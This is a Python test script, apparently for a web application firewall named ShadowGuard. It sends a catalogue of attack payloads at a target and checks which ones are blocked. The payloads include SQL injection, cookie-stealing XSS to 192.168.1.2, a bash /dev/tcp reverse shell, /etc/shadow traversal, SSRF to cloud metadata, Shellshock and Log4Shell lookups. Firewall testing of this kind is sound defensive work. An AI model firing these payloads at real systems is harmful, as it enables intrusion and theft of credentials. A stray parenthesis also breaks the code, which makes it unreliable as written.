import argparse
import time
import json
import sys
import threading
from datetime import datetime

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("Install requests: pip install requests")
    sys.exit(1)

C = {
    "red":    "\033[91m",
    "green":  "\033[92m",
    "yellow": "\033[93m",
    "cyan":   "\033[96m",
    "white":  "\033[97m",
    "bold":   "\033[1m",
    "dim":    "\033[2m",
    "reset":  "\033[0m",
}
def c(color, text): return C.get(color, "") + str(text) + C["reset"]
def bold(t):        return c("bold", t)
def dim(t):         return c("dim", t)



#ATTACK DEFINITIONS
#Each entry: (name, method, path, params_or_data, expected, category)

ATTACKS = [

    #SQL Injection
    ("SQLi – Union Select",
     "GET", "/search", {"q": "' UNION SELECT id,username,password,email,role FROM users--"},
     "BLOCKED", "sqli"),
    ("SQLi – Tautology (quote)",
     "GET", "/search", {"q": "' OR '1'='1"},
     "BLOCKED", "sqli"),
    ("SQLi – Auth Bypass",
     "POST", "/login", {"username": "admin'--", "password": "wrong"},
     "BLOCKED", "sqli"),
    ("SQLi – Time-Based Blind",
     "GET", "/search", {"q": "1' AND SLEEP(5)--"},
     "BLOCKED", "sqli"),
    ("SQLi – Stacked Query",
     "POST", "/login", {"username": "'; DROP TABLE users--", "password": "x"},
     "BLOCKED", "sqli"),
    ("SQLi – Boolean Blind",
     "GET", "/search", {"q": "1' AND 1=1--"},
     "BLOCKED", "sqli"),
    ("SQLi – Comment Bypass",
     "GET", "/search", {"q": "admin'/**/OR/**/1=1--"},
     "BLOCKED", "sqli"),
    ("SQLi – API Endpoint",
     "GET", "/api/users", {"role": "' OR '1'='1"},
     "BLOCKED", "sqli"),
    ("SQLi – UNION 5 columns",
     "GET", "/api/users", {"role": "admin' UNION SELECT 1,2,3,4--"},
     "BLOCKED", "sqli"),

    # ── XSS ───────────────────────────────────────────────────────────────
    ("XSS – Script Tag",
     "GET", "/profile", {"name": "<script>alert('XSS')</script>"},
     "BLOCKED", "xss"),
    ("XSS – IMG onerror",
     "GET", "/profile", {"name": "<img src=x onerror=alert(document.cookie)>"},
     "BLOCKED", "xss"),
    ("XSS – SVG onload",
     "GET", "/search", {"q": "<svg/onload=fetch('http://192.168.1.2:8000?c='+document.cookie)>"},
     "BLOCKED", "xss"),
    ("XSS – javascript: Protocol",
     "GET", "/profile", {"name": "javascript:alert(1)"},
     "BLOCKED", "xss"),
    ("XSS – Stored via Comment",
     "POST", "/comment", {"author": "hacker", "content": "<script>document.location='http://192.168.1.2'</script>"},
     "BLOCKED", "xss"),
    ("XSS – Case Obfuscation",
     "GET", "/profile", {"name": "<ScRiPt>alert(1)</ScRiPt>"},
     "BLOCKED", "xss"),
    ("XSS – URL Encoded",
     "GET", "/profile", {"name": "%3Cscript%3Ealert(1)%3C%2Fscript%3E"},
     "BLOCKED", "xss"),

    #Path Traversal
    ("Path – /etc/passwd",
     "GET", "/file", {"path": "../../etc/passwd"},
     "BLOCKED", "path"),
    ("Path – Multi Level",
     "GET", "/file", {"path": "../../../../etc/shadow"},
     "BLOCKED", "path"),
    ("Path – URL Encoded",
     "GET", "/file", {"path": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
     "BLOCKED", "path"),
    ("Path – Windows Style",
     "GET", "/file", {"path": "..\\..\\windows\\system32\\cmd.exe"},
     "BLOCKED", "path"),
    ("Path – Double Encoded",
     "GET", "/file", {"path": "..%252f..%252fetc%252fpasswd"},
     "BLOCKED", "path"),
    ("Path – .htaccess",
     "GET", "/file", {"path": "../../.htaccess"},
     "BLOCKED", "path"),

    #Command Injection
    ("CMD – Semicolon",
     "GET", "/ping", {"host": "127.0.0.1; cat /etc/passwd"},
     "BLOCKED", "cmd"),
    ("CMD – Pipe",
     "GET", "/ping", {"host": "127.0.0.1 | id"},
     "BLOCKED", "cmd"),
    ("CMD – Logical AND",
     "GET", "/ping", {"host": "127.0.0.1 && whoami"},
     "BLOCKED", "cmd"),
    ("CMD – Backtick Sub",
     "GET", "/ping", {"host": "`whoami`"},
     "BLOCKED", "cmd"),
    ("CMD – Dollar Paren",
     "GET", "/ping", {"host": "$(id)"},
     "BLOCKED", "cmd"),
    ("CMD – Reverse Shell",
     "GET", "/ping", {"host": "127.0.0.1; bash -i >& /dev/tcp/192.168.1.2/4444 0>&1"},
     "BLOCKED", "cmd"),

    #SSRF 
    ("SSRF – Localhost",
     "GET", "/fetch", {"url": "http://localhost:8080/api/status"},
     "BLOCKED", "ssrf"),
    ("SSRF – 127.0.0.1",
     "GET", "/fetch", {"url": "http://127.0.0.1:8080/api/users"},
     "BLOCKED", "ssrf"),
    ("SSRF – AWS Metadata",
     "GET", "/fetch", {"url": "http://169.254.169.254/latest/meta-data/"},
     "BLOCKED", "ssrf"),
    ("SSRF – Internal LAN",
     "GET", "/fetch", {"url": "http://192.168.1.1:8080/api/status"},
     "BLOCKED", "ssrf"),

    #Header Attacks
    ("Shellshock – User-Agent",
     "GET", "/", {},
     "BLOCKED", "header"),
    ("Log4Shell",
     "GET", "/search", {"q": "${jndi:ldap://192.168.1.2:1389/exploit}"},
     "BLOCKED", "header"),
    ("Log4Shell – Obfuscated",
     "GET", "/search", {"q": "${${lower:j}ndi:${lower:l}dap://192.168.1.2/x}"},
     "BLOCKED", "header"),

    #Scanner UA Fingerprints
    ("Scanner – sqlmap UA",
     "GET", "/search", {"q": "test"},
     "BLOCKED", "scanner"),
    ("Scanner – Nikto UA",
     "GET", "/", {},
     "BLOCKED", "scanner"),

    #Safe Requests (should ALL be ALLOWED)
    ("Safe – Normal product search",
     "GET", "/search", {"q": "laptop"},
     "ALLOWED", "safe"),
    ("Safe – Category filter",
     "GET", "/search", {"q": "electronics"},
     "ALLOWED", "safe"),
    ("Safe – Valid login",
     "POST", "/login", {"username": "alice", "password": "password1"},
     "ALLOWED", "safe"),
    ("Safe – View readme",
     "GET", "/file", {"path": "/etc/hostname"},
     "ALLOWED", "safe"),
    ("Safe – Ping valid host",
     "GET", "/ping", {"host": "8.8.8.8"},
     "ALLOWED", "safe"),
    ("Safe – Profile page",
     "GET", "/profile", {"name": "John Doe"},
     "ALLOWED", "safe"),
    ("Safe – API normal query",
     "GET", "/api/users", {"role": "user"},
     "ALLOWED", "safe"),
    ("Safe – Home page",
     "GET", "/", {},
     "ALLOWED", "safe"),
    ("Safe – Post a comment",
     "POST", "/comment", {"author": "alice", "content": "Great product!"},
     "ALLOWED", "safe"),
    ("Safe – Search with numbers",
     "GET", "/search", {"q": "1299.99"},
     "ALLOWED", "safe"),
]

#Special attack entries with custom headers
SPECIAL_ATTACKS = {
    "Shellshock – User-Agent": {
        "User-Agent": "() { :; }; echo Content-Type: text/html; echo; /bin/cat /etc/passwd"
    },
    "Scanner – sqlmap UA": {
        "User-Agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"
    },
    "Scanner – Nikto UA": {
        "User-Agent": "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001143)"
    },
}


def run_test(base_url: str, name: str, method: str, path: str,
             params: dict, expected: str, category: str, delay: float) -> dict:
    url = base_url + path
    headers = SPECIAL_ATTACKS.get(name, {"User-Agent": "ShadowGuard-TestSuite/2.0"})

    try:
        if method == "GET":
            r = requests.get(url, params=params, headers=headers,
                             timeout=8, verify=False, allow_redirects=False)
        else:
            r = requests.post(url, data=params, headers=headers,
                              timeout=8, verify=False, allow_redirects=False)

        status   = r.status_code
        blocked  = status in (403, 429)
        actual   = "BLOCKED" if blocked else "ALLOWED"
        passed   = actual == expected
        symbol   = "✓" if passed else "✗"
        col      = "green" if passed else "red"

        #Show detection info if WAF returned JSON
        tier_info = ""
        try:
            data = r.json()
            if "detection_tier" in data:
                tier_info = dim(f" [T{data['detection_tier']}|{data.get('triggered_rule','?')[:30]}]")
        except Exception:
            pass

        print(f"  {c(col, symbol)} {name:<42} → {c(col, actual):20} "
              f"HTTP {status}{tier_info}")
        time.sleep(delay)
        return {"name": name, "category": category, "expected": expected,
                "actual": actual, "passed": passed, "status": status}

    except requests.exceptions.ConnectionError:
        print(f"  {c('red','✗')} {name:<42} → {c('red','CONNECTION REFUSED')}")
        return {"name": name, "category": category, "expected": expected,
                "actual": "ERROR", "passed": False, "status": 0}
    except Exception as e:
        print(f"  {c('red','✗')} {name:<42} → {c('red', f'ERROR: {e}')}")
        return {"name": name, "category": category, "expected": expected,
                "actual": "ERROR", "passed": False, "status": 0}


def run_compare(waf_url: str, direct_url: str, delay: float):
    """
    Run same attacks against both WAF and direct target.
    Shows the contrast: unprotected app is vulnerable, WAF blocks.
    """
    )
    print(bold(c("cyan", "  COMPARE MODE: WAF vs Unprotected")))
    print(bold(f"  WAF    : {waf_url}"))
    print(bold(f"  Direct : {direct_url}  (no WAF, completely vulnerable)"))
    

    compare_attacks = [
        ("SQLi – Union Select",
         "GET", "/search", {"q": "' UNION SELECT id,username,password,email,role FROM users--"}),
        ("SQLi – Auth Bypass",
         "POST", "/login", {"username": "admin'--", "password": "x"}),
        ("XSS – Script Tag",
         "GET", "/profile", {"name": "<script>alert(document.cookie)</script>"}),
        ("Path – /etc/passwd",
         "GET", "/file", {"path": "../../etc/passwd"}),
        ("CMD – Semicolon",
         "GET", "/ping", {"host": "127.0.0.1; id"}),
    ]

    for name, method, path, params in compare_attacks:
        ua = {"User-Agent": "TestSuite/2.0"}
        try:
            if method == "GET":
                r_waf    = requests.get(waf_url + path,    params=params, headers=ua, timeout=5, verify=False)
                r_direct = requests.get(direct_url + path, params=params, headers=ua, timeout=5, verify=False)
            else:
                r_waf    = requests.post(waf_url + path,    data=params, headers=ua, timeout=5, verify=False)
                r_direct = requests.post(direct_url + path, data=params, headers=ua, timeout=5, verify=False)

            waf_blocked    = r_waf.status_code in (403, 429)
            direct_blocked = r_direct.status_code in (403, 429)

            waf_str    = c("green", f"BLOCKED ({r_waf.status_code})") if waf_blocked else c("red", f"ALLOWED ({r_waf.status_code})")
            direct_str = c("red", f"ALLOWED ({r_direct.status_code}) ← VULNERABLE") if not direct_blocked else c("yellow", "Blocked")

            print(f"\n  {bold(name)}")
            print(f"    WAF    : {waf_str}")
            print(f"    Direct : {direct_str}")

            #For SQLi auth bypass, show what the direct app actually returns
            if name == "SQLi – Auth Bypass" and not direct_blocked:
                try:
                    if "SUCCESS" in r_direct.text:
                        print(c("red", "    ⚠️  DIRECT APP: Authentication BYPASSED — logged in as admin without password!"))
                except Exception:
                    pass

        except Exception as e:
            print(f"  Error on {name}: {e}")
        time.sleep(delay)


def run_rate_limit_test(base_url: str):
    """Test that rate limiting kicks in after 30 req/10s."""
    print(bold(f"\n{'─'*50}"))
    print(bold("  Rate Limit Test"))
    print(f"  Sending 40 requests rapidly...")
    results = {}
    for i in range(1, 41):
        try:
            r = requests.get(f"{base_url}/search", params={"q": f"test{i}"},
                             timeout=3, verify=False)
            code = r.status_code
            results[code] = results.get(code, 0) + 1
        except Exception:
            results["error"] = results.get("error", 0) + 1
    print(f"  Status code distribution: {results}")
    if 429 in results:
        print(c("green", f"  ✓ Rate limiter triggered: {results[429]} requests got 429"))
    else:
        print(c("yellow", "  ─ No 429s seen (might need faster sending or lower threshold)"))


def main():
    parser = argparse.ArgumentParser(description="ShadowGuard LAN Attack Test Suite v2")
    parser.add_argument("--target",   default="localhost",  help="WAF IP/hostname")
    parser.add_argument("--port",     type=int, default=80, help="WAF port")
    parser.add_argument("--delay",    type=float, default=0.2, help="Delay between requests (s)")
    parser.add_argument("--mode",     default="standard", choices=["standard","full","compare"])
    parser.add_argument("--category", default="all",
                        choices=["all","sqli","xss","path","cmd","ssrf","header","scanner","safe"])
    parser.add_argument("--direct-port", type=int, default=8080,
                        help="Unprotected app port (for compare mode)")
    args = parser.parse_args()

    base_url   = f"http://{args.target}:{args.port}"
    direct_url = f"http://{args.target}:{args.direct_port}"

    
    print(bold(c("cyan", "ShadowGuard: LAN Attack Test Suite")))
    
    print(f"  WAF target : {c('cyan', base_url)}")
    print(f"  Mode       : {args.mode}")
    print(f"  Time       : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
   

    # Compare mode: show the dramatic before/after
    if args.mode == "compare":
        run_compare(base_url, direct_url, args.delay)
        run_rate_limit_test(base_url)
        return

    # Filter attacks by category
    attacks = ATTACKS
    if args.category != "all":
        attacks = [a for a in ATTACKS if a[5] == args.category]
        if not attacks:
            print(c("red", f"No attacks found for category: {args.category}"))
            return

    results    = []
    categories = {}
    current    = None

    for name, method, path, params, expected, category in attacks:
        if category != current:
            cat_label = {
                "sqli": "SQL Injection", "xss": "Cross-Site Scripting",
                "path": "Path Traversal", "cmd": "Command Injection",
                "ssrf": "Server-Side Request Forgery", "header": "Header Attacks",
                "scanner": "Scanner Detection", "safe": "Safe Requests (should be ALLOWED)",
            }.get(category, category.upper())
            print(c("yellow", f"\n  ┌─ {cat_label} {'─'*(50-len(cat_label))}"))
            current = category

        r = run_test(base_url, name, method, path, params, expected, category, args.delay)
        results.append(r)
        categories.setdefault(category, []).append(r)

    # Rate limit test in full mode
    if args.mode == "full":
        run_rate_limit_test(base_url)

    # Summary
    passed   = sum(1 for r in results if r["passed"])
    total    = len(results)
    attacks_blocked  = sum(1 for r in results if r["expected"] == "BLOCKED" and r["passed"])
    safe_passed      = sum(1 for r in results if r["expected"] == "ALLOWED"  and r["passed"])
    false_positives  = sum(1 for r in results if r["expected"] == "ALLOWED"  and not r["passed"])
    false_negatives  = sum(1 for r in results if r["expected"] == "BLOCKED"  and not r["passed"])

    
    print(bold(f"  RESULTS"))
    
    print(f"  Total Tests         : {total}")
    print(f"  Passed              : {c('green', passed)} / {total}  "
          f"({passed/total*100:.1f}%)")
    print(f"  Attacks Blocked     : {c('green', attacks_blocked)}")
    print(f"  Safe Requests Passed: {c('green', safe_passed)}")
    print(f"  False Positives     : {c('red' if false_positives else 'green', false_positives)}  "
          f"← safe requests wrongly blocked")
    print(f"  False Negatives     : {c('red' if false_negatives else 'green', false_negatives)}  "
          f"← attacks that got through")
    print()

    for cat, cat_results in categories.items():
        p   = sum(1 for r in cat_results if r["passed"])
        t   = len(cat_results)
        bar = "█" * p + "░" * (t - p)
        col = "green" if p == t else "yellow" if p >= t * 0.7 else "red"
        print(f"  {cat:<10} {c(col, bar)} {p}/{t}")

    

    if false_positives == 0 and false_negatives == 0:
        print(c("green", bold("  PERFECT — WAF blocked all attacks, passed all safe requests. 🛡️")))
    elif false_positives > 0:
        print(c("yellow", f"{false_positives} safe request(s) wrongly blocked. "
                          f"Check WAF threshold or rule tuning."))
    elif false_negatives > 0:
        print(c("red",    f"{false_negatives} attack(s) got through. "
                          f"Lower ML threshold or add specific rules."))

    

    # Save results
    out = {
        "timestamp": datetime.now().isoformat(),
        "target": base_url,
        "summary": {
            "total": total, "passed": passed,
            "false_positives": false_positives,
            "false_negatives": false_negatives,
            "detection_rate": f"{attacks_blocked/(total-len([r for r in results if r['expected']=='ALLOWED']))*100:.1f}%"
        },
        "results": results,
    }
    outfile = f"test_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    try:
        with open(outfile, "w") as f:
            json.dump(out, f, indent=2)
        print(f"  Results saved: {outfile}")
    except Exception:
        pass


if __name__ == "__main__":
    main()